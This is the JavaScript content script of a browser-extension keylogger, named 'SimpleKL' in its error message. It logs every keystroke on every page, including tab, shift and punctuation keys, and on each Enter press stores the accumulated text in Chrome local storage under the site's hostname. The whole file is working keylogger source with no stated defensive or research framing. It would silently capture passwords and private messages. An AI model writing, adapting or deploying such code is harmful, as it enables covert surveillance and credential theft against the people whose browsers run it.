var input = '', key = location.hostname, items = {};
$(document).keydown(function(e){ 
  if (e.which == 13){
    chrome.storage.local.get(key, function(result){
      input += '\n';
      if (result[key] === undefined){
        items[key] = input;
        chrome.storage.local.set(items, function(){
          if (chrome.extension.lastError){
            console.log('Error in SimpleKL set(): ' + chrome.extension.lastError.message);
          }
        });
      }  else {
        // Input from this site already exists in storage
        items[key] = result[key] + input;
        chrome.storage.local.set(items);
      }
      input = '';
    });
  } else if (e.which === 9){
    input += '<tab>';
  } else if (e.which === 8){
    input += '<backspace>';
  } else if (e.which === 16){
    input += '<shift>';
  } else if (e.which === 17){
    input += '<ctrl>';
  } else if (e.which === 20){
    input += '<capslock>';
  } else if (e.which === 188){
    input += '<comma>';
  } else if (e.which === 187){
    input += '<equal>';
  } else if (e.which === 186){
    input += '<semicolon>';
  } else if (e.which === 190){
    input += '<period>';
  } else {
    input += String.fromCharCode(e.which);
  }
});